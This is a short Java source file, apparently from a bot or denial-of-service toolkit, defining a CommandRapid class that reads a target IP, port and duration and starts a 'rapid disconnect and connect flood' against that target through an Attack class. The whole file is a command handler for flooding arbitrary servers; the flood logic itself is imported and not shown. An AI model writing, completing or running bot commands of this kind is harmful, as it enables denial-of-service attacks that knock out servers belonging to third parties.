package commands;

import attack.Attack;
import attack.Rapid;
import bot.Main;

public class CommandRapid extends Command {

	/**
	 * Initializes rapid disconnect and connect flood
	 */
	@Override
	public void perform() throws Exception {
		String ip = Main.readString();
		int port = Main.readInt();
		int time = Main.readInt();
		
		Attack attack = new Rapid(ip, port);
		Attack.begin(time, attack);
	}

}
